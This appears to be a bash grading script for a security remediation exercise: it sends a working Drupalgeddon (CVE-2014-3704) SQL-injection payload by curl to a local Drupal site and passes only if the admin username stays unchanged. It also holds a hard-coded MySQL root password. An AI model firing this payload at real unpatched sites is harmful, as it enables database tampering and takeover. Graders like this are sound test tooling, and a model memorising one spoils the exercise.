#!/bin/bash
# Verification script for Scenario 06: Drupalgeddon (CVE-2014-3704 / SA-CORE-2014-005)
# Exit 0 = remediated (PASS), Exit 1 = still vulnerable or broken (FAIL)
#
# This fires the REAL Drupalgeddon SQL-injection against the live site and
# checks whether it can mutate the database. Notes vs. the earlier version:
#   * root@localhost has a password ('sploitme'); mysql must be called with it,
#     otherwise every query returns "Access denied" and the check is inert.
#   * the working pre-auth payload needs op=Log+in AND a second name[0] key --
#     without them the login form is never processed and the injection silently
#     no-ops (the old payload always "passed", masking the vulnerability).
#   * we do NOT gate on CHANGELOG.txt >= 7.32: the official one-line
#     database.inc patch fixes the flaw without a version bump, and the live
#     injection is the ground truth anyway.
# The verifier snapshots and restores uid=1's name so grading never mutates the box.

PASS=true
MYSQL="mysql -u root -psploitme"
Q(){ $MYSQL drupal -sNe "$1" 2>/dev/null; }

# --- DB must be reachable (regression prerequisite) ---
BEFORE=$(Q "SELECT name FROM users WHERE uid=1;")
if [ -z "$BEFORE" ]; then
    echo "FAIL [Regression]: cannot read Drupal users table (DB down or creds wrong)." >&2
    echo "RESULT: REMEDIATION FAILED"; exit 1
fi

# --- snapshot + guaranteed restore ---
SENTINEL="msf_verify_$$"
restore_uid1() { $MYSQL drupal -sNe "UPDATE users SET name='${BEFORE//\'/\'\'}' WHERE uid=1;" 2>/dev/null || true; }
trap restore_uid1 EXIT INT TERM

# --- PoC: attempt the injection to rename uid=1 to our sentinel ---
timeout 30 curl -s "http://localhost/drupal/?q=node&destination=node" \
    --data "pass=lol&form_build_id=&form_id=user_login_block&op=Log+in&name[0%20;UPDATE+users+SET+name%3d0x$(printf '%s' "$SENTINEL" | od -An -tx1 | tr -d ' \n')+WHERE+uid%3d1;;%23%20]=bob&name[0]=larry" \
    -o /dev/null || true

AFTER=$(Q "SELECT name FROM users WHERE uid=1;")
restore_uid1
trap - EXIT INT TERM

if [ "$AFTER" = "$SENTINEL" ]; then
    echo "FAIL [PoC]: Drupalgeddon injection succeeded -- uid=1 was renamed via SQLi." >&2
    PASS=false
else
    echo "PASS [PoC]: Drupalgeddon injection did not alter the database (uid=1 name unchanged)."
fi

# --- Regression: Drupal homepage must still return 200 ---
HOME_CODE=$(timeout 20 curl -so /dev/null -w '%{http_code}' http://localhost/drupal/)
if [ "$HOME_CODE" = "200" ]; then
    echo "PASS [Regression]: /drupal/ homepage is reachable (HTTP 200)."
else
    echo "FAIL [Regression]: /drupal/ returned HTTP $HOME_CODE -- expected 200." >&2
    PASS=false
fi

if $PASS; then
    echo "RESULT: REMEDIATION SUCCESSFUL"
    exit 0
else
    echo "RESULT: REMEDIATION FAILED"
    exit 1
fi
